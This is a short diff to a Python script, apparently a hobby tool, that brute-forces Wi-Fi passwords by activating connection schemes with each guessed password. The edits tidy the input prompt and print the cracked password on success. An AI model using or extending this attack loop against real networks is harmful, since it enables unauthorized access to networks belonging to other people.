@@ -14,8 +14,7 @@ def choose(items, item_name):
     print('choose {0}'.format(item_name))
     for i, item in enumerate(items):
         print('  {0}> {1}'.format(i, item))
-    print('chioce: ', end='')
-    return items[int(input())]
+    return items[int(input('chioce: '))]
 
 
 def get_interface():
@@ -46,9 +45,10 @@ def hack(interface, cell):
     print('starting dictionary attack...')
     for password in gen_passwd():
         err = False
+        name = int(time.time())
         try:
             print('   now trying: {0}'.format(password))
-            scheme = wifi.Scheme.for_cell(interface, int(time.time()), cell, password)
+            scheme = wifi.Scheme.for_cell(interface, name, cell, password)
             scheme.delete()
             scheme.save()
             scheme.activate()
@@ -56,7 +56,8 @@ def hack(interface, cell):
             err = True
 
         if not err:
-            break
+            print('cracked! password was: {0}'.format(password))
+            quit()
 
 
 if __name__ == '__main__':
